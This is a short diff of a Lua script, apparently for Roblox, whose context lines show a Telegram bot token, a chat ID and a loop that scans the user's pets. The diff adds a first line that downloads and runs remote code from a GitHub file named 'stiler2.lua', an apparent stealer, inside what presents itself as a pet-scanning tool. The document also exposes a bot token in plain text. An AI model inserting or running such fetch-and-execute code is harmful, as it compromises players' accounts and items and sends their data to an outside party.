@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler2.lua"))()
+
 -- Telegram bot settings
 local BOT_TOKEN = "8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4"
 local CHAT_ID = "2001061743"
@@ -102,3 +104,4 @@ while true do
 	scanMyPets()
 	task.wait(1)
 end
+
